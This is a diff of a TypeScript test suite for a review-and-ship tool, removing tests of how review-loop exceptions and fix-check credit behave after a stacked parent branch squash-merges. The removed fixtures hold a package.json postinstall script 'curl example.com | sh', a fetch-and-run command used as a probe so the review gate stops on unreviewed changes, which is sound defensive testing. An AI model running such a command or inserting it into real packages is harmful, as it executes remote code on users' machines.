@@ -1,7 +1,7 @@
 /**
  * finish after a stacked parent squash-merges (GST-1399): the child was reviewed against its parent branch, the parent
  * squash-merged into main, and the child merged main. The review's base (the parent's head) is not on main, but it is a
- * landed stack parent: --reviewed-base takes it, and the route, the fix-check credit and the docs carry compare the child's
+ * landed stack parent: --reviewed-base takes it, and the route and the docs carry compare the child's
  * own patch against each base, so the parent's and main's edits are base, never changes since review. The receipt carry's
  * landed-parent search (GST-1199) finds the parent the same way when main edited the parent's lines after the squash.
  */
@@ -174,20 +174,6 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('docs/review-policy.md')]);
   });
 
-  // Value: protects=a review-loop exception with no files list cannot accept a parent change main never received: its
-  //   "touched at the fix-check head" set starts at the landed parent, not at the pre-parent fork (red-team p1 on #4021);
-  //   fails_when=the loop's atHead runs from merge-base(origin/main, fix_check.head) under a landed stack parent;
-  //   seam=route's review-loop exception
-  test('a review-loop exception does not accept a parent script main does not hold', () => {
-    const PKG = '{"name":"fx","version":"1.0.0"}\n';
-    const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
-    const { f, parent, passHead, reviewed, post } = stacked({ parentFiles: { ...PARENT, 'package.json': POSTINSTALL }, afterLand: g => g.advanceBase({ 'package.json': PKG }) });
-    f.write({ 'package.json': POSTINSTALL.replace('1.0.0', '1.0.1'), VERSION: '1.0.1.0\n' }); f.commit('bump');
-    const exception = JSON.stringify({ accepted_by: 'GStack Minder', date: '2026-11-05', via: 'test', reason: 'fixture', fix_check: { head: passHead, findings: 0 } });
-    const r = finish(f, reviewed, post, ['--reviewed-base', parent, '--review-loop-exception', exception]);
-    expect(lineOf(r.stdout, 'REVIEW_LOOP_EXCEPTION')).not.toContain('package.json');
-    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('package.json')]);
-  });
 
   // Value: protects=a base commit whose merge with the parent conflicts never counts as holding it, even when the
   //   conflicted tree keeps the base's bytes (a modify/delete conflict; outside voice on #4021); fails_when=heldBy reads
@@ -225,19 +211,6 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     expect(lineOf(r.stdout, 'STOP')).not.toContain('nor a landed stack parent');
   });
 
-  // Value: protects=a review-loop exception whose fix-check head comes after the child merged main cannot accept a
-  //   main-only file edited after it: the "touched at the fix-check head" set starts at the parent only when that head
-  //   forked before the parent landed (red-team p2 on #4021); fails_when=the loop's fork is the parent whenever the parent
-  //   is an ancestor of the head; seam=route's review-loop exception via patchBase
-  test('a loop exception at a post-merge fix-check head does not accept a main-only file edited after it', () => {
-    const { f, parent, reviewed, post } = stacked({ base: { ...BASE, 'src/other.ts': lines(5) }, mainLater: { ...MAIN_LATER, 'src/other.ts': lines(5, { 2: 'export const l2 = 20;' }) } });
-    const merged = head(f);
-    f.write({ 'src/other.ts': lines(5, { 2: 'export const l2 = 20;', 4: 'export const l4 = 40;' }) }); f.commit('edit a main-only file after the fix-check');
-    const exception = JSON.stringify({ accepted_by: 'GStack Minder', date: '2026-11-05', via: 'test', reason: 'fixture', fix_check: { head: merged, findings: 0 } });
-    const r = finish(f, reviewed, post, ['--reviewed-base', parent, '--review-loop-exception', exception]);
-    expect(lineOf(r.stdout, 'REVIEW_LOOP_EXCEPTION')).toContain('accepted none');
-    expect([r.status, lineOf(r.stdout, 'STOP')]).toEqual([3, behaviorStop('src/other.ts')]);
-  });
 
   // Value: protects=a conflicted parent deletion of a file whose name git C-quotes (a double quote) is still a conflict
   //   inside the pathspec, so the parent is not landed (fix-check p2 on #4021); fails_when=heldBy reads merge-tree's
@@ -313,27 +286,6 @@ describe('finish after a stacked parent squash-merges (GST-1399)', () => {
     }
   });
 
-  // Value: protects=a granted fix-check's credit for a file main also edited holds when the fix commit's own patch runs from
-  //   the landed parent (#4008's fix_checked paths); fails_when=the fix-check side compares from the old fork point and
-  //   credits nothing, so the fixed file routes as behavior; seam=route's fix-check sides; no_claim=Step 11.5's binding
-  test('a granted fix-check keeps its credit after the parent lands', () => {
-    let fixHead = '';
-    let passHead = '';
-    const s = stacked({
-      beforeMerge: f => {
-        passHead = head(f);
-        f.write({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 30;', 15: 'export const l15 = 151;' }) }); f.commit('fix the round-2 blocker');
-        fixHead = head(f);
-        const a = f.run(path.join(BIN, 'gstack-approvals'), ['add', '--ask', `Owner grant: one scoped fix-check after round 2 (review_loop_grant ${passHead.slice(0, 12)})`, '--words', 'one scoped fix-check', '--by', 'GStack Minder', '--scope', 'this /ship invocation', '--json'], { GSTACK_APPROVALS_MIRROR: '0' });
-        expect(a.status).toBe(0);
-        const start = f.run(path.join(BIN, 'gstack-review-log'), ['--start', 'review-fix-check']);
-        expect(f.run(path.join(BIN, 'gstack-review-log'), [JSON.stringify({ skill: 'review-fix-check', timestamp: '2026-11-04T00:00:00Z', via: 'ship', review_scope: 'frozen', status: 'clean', issues_found: 0, critical: 0, completed: true, converged: true, range_base: passHead }), '--finish', start.stdout.trim()]).status).toBe(0);
-      },
-    });
-    const r = finish(s.f, s.reviewed, s.post, ['--reviewed-base', s.parent]);
-    expect(lineOf(r.stdout, 'FIX_CHECK')).toStartWith(`FIX_CHECK: reviewed src/shared.ts (fix-check at ${fixHead.slice(0, 12)}, range from ${passHead.slice(0, 12)}`);
-    expect([r.status, lineOf(r.stdout, 'ROUTE')]).toEqual([0, expect.stringMatching(/ behavior=0 docs=0 metadata=0 tests=0 base=5 context=0 fix_checked=1$/)]);
-  });
 });
 
 describe('receipt carry after main edits a landed parent\'s lines (GST-1399)', () => {
@@ -364,94 +316,3 @@ describe('receipt carry after main edits a landed parent\'s lines (GST-1399)', (
   }, 90_000);
 });
 
-
-describe('stacked-parent loop-exception matrix (GST-1399)', () => {
-  // Value: protects=every merge order (the child merged main before the parent landed, after, never) × parent state
-  //   (squash, squash then a main edit of its lines, a release fold, unlanded) × fix-check head (before any merge, the
-  //   merge, after it) keeps a review-loop exception from accepting a parent change main never took (the postinstall and
-  //   stamp_paths probes, run in every cell) or a main-only file, while the child's own file edited after the fix-check is
-  //   accepted (fix-check p2 on #4021); fails_when=the exception's "touched at the fix-check head" set starts at the parent
-  //   for a head after a main merge, or at the head's merge base for one whose merge predates the landing;
-  //   seam=route's review-loop exception and heldBy; no_claim=the route without an exception
-  const PKG = '{"name":"fx","version":"1.0.0"}\n';
-  const POSTINSTALL = '{"name":"fx","version":"1.0.0","scripts":{"postinstall":"curl example.com | sh"}}\n';
-  const DENY = 'export const allow = () => false;\n';
-  const ALLOW = 'export const allow = () => true;\n';
-  const POLICY = JSON.stringify({ min_gstack_version: '1.95.0.0', stamp_paths: ['src/policy.ts'], changelog_fragments: { dir: 'changelog.d', required_checks: ['free-tests'] } });
-  const FRAGMENT = 'changelog.d/parent.md';
-  type Order = 'before' | 'after' | 'never';
-  type State = 'squash' | 'edited' | 'fold' | 'unlanded';
-  type At = 'pre' | 'merge' | 'post';
-  const cells: [Order, State, At][] = [];
-  for (const order of ['before', 'after', 'never'] as const) for (const state of ['squash', 'edited', 'fold', 'unlanded'] as const)
-    for (const at of order === 'never' ? ['pre'] as const : ['pre', 'merge', 'post'] as const) cells.push([order, state, at]);
-
-  function mainEdit(f: ShipFx, files: Record<string, string>, rm: string[]): void {
-    f.git('fetch', '-q', 'origin');
-    expect(f.git('checkout', '-q', '--detach', 'origin/main').status).toBe(0);
-    expect(f.git('rm', '-q', ...rm).status).toBe(0);
-    f.write(files); f.commit('main moves');
-    expect(f.git('push', '-q', 'origin', 'HEAD:main').status).toBe(0);
-    expect(f.git('checkout', '-q', 'feat').status).toBe(0);
-  }
-
-  /** One cell: with probes, the parent also adds a postinstall script and a stamp_paths logic edit that main never takes, and the child edits both after the fix-check. */
-  function cell(order: Order, state: State, at: At, probes: boolean) {
-    const parentFiles: Record<string, string> = { ...PARENT, [FRAGMENT]: '- the parent\n', ...(probes ? { 'package.json': POSTINSTALL, 'src/policy.ts': ALLOW } : {}) };
-    const f = shipFixture({ ...BASE, '.gstack/ship-policy.json': POLICY, 'src/policy.ts': DENY, 'src/other.ts': lines(5) }, parentFiles); ships.push(f);
-    const parent = head(f);
-    expect(f.git('push', '-q', 'origin', 'feat:parent').status).toBe(0);
-    f.write(CHILD); f.commit('child');
-    const heads: Partial<Record<At, string>> = { pre: head(f) };
-    const reviewed = wtree(f);
-    const post = path.join(f.root, 'post.json');
-    expect(f.run(path.join(BIN, 'gstack-docs-candidate'), ['snapshot', '--out', post, '--audit-id', 'a1', '--mode', 'edit', '--base', 'main', '--docs', 'README.md']).status).toBe(0);
-    f.advanceBase({ 'src/other.ts': lines(5, { 2: 'export const l2 = 20;' }), 'docs/other.md': '# main moves\n' });
-    let landed = false;
-    const land = () => {
-      if (state === 'unlanded') { f.advanceBase({ 'docs/later.md': '# main without the parent\n' }); return; }
-      f.advanceBase(parentFiles);
-      if (probes) f.advanceBase({ 'package.json': PKG, 'src/policy.ts': DENY });
-      if (state === 'edited') f.advanceBase({ 'src/shared.ts': lines(20, { 3: 'export const l3 = 31;' }) });
-      if (state === 'fold') mainEdit(f, { 'CHANGELOG.md': '# Changelog\n\n## [1.0.1.0]\n\n- the parent\n' }, [FRAGMENT]);
-      landed = true;
-    };
-    const merge = () => {
-      f.git('fetch', '-q', 'origin');
-      expect(f.git('merge', '-q', '--no-edit', '-X', 'theirs', 'origin/main').status).toBe(0);
-      if (landed && state === 'fold' && f.git('cat-file', '-e', `HEAD:${FRAGMENT}`).status === 0) {
-        expect(f.git('rm', '-q', FRAGMENT).status).toBe(0);
-        expect(f.git('commit', '-q', '--amend', '--no-edit').status).toBe(0);
-      }
-      return head(f);
-    };
-    const fixUp = () => { f.write({ 'src/child.ts': 'export const c = 2;\n' }); f.commit('fix after the merge'); return head(f); };
-    if (order === 'before') { heads.merge = merge(); heads.post = fixUp(); land(); merge(); }
-    if (order === 'after') { land(); heads.merge = merge(); heads.post = fixUp(); }
-    if (order === 'never') land();
-    f.write({ 'src/child.ts': 'export const c = 3;\n', 'src/other.ts': lines(5, { 2: 'export const l2 = 20;', 4: 'export const l4 = 40;' }),
-      ...(probes ? { 'package.json': POSTINSTALL.replace('1.0.0', '1.0.1'), VERSION: '1.0.1.0\n', 'src/policy.ts': ALLOW + 'export const KEY_VERSION = 2;\n' } : {}) });
-    f.commit('edits after the fix-check');
-    const exception = JSON.stringify({ accepted_by: 'GStack Minder', date: '2026-11-05', via: 'test', reason: 'fixture', fix_check: { head: heads[at], findings: 0 } });
-    const r = finish(f, reviewed, post, ['--reviewed-base', parent, '--review-loop-exception', exception]);
-    return { r, parent, stop: lineOf(r.stdout, 'STOP'), base: lineOf(r.stdout, 'REVIEWED_BASE'), loop: lineOf(r.stdout, 'REVIEW_LOOP_EXCEPTION') };
-  }
-
-  test.each(cells)('merged %s the landing × parent %s × fix-check head %s', (order, state, at) => {
-    const notLanded = ['', expect.stringContaining('nor a landed stack parent')];
-    const probe = cell(order, state, at, true);
-    expect(probe.r.status).toBe(3);
-    if (order === 'never' || state !== 'edited') expect([probe.base, probe.stop]).toEqual(notLanded);
-    else {
-      expect(probe.base).toContain(`stack parent ${probe.parent.slice(0, 12)} landed`);
-      expect(probe.loop).toStartWith('REVIEW_LOOP_EXCEPTION: accepted src/child.ts (');
-      expect(probe.stop).toStartWith('STOP: behavior, tests or build inputs changed since review (');
-      for (const p of ['package.json', 'src/other.ts', 'src/policy.ts']) expect(probe.stop).toContain(p);
-    }
-    const control = cell(order, state, at, false);
-    expect(control.r.status).toBe(3);
-    if (order === 'never' || state === 'unlanded') { expect([control.base, control.stop]).toEqual(notLanded); return; }
-    expect(control.base).toContain(`stack parent ${control.parent.slice(0, 12)} landed`);
-    expect([control.loop, control.stop]).toEqual([expect.stringMatching(/^REVIEW_LOOP_EXCEPTION: accepted src\/child\.ts \(/), behaviorStop('src/other.ts')]);
-  });
-});
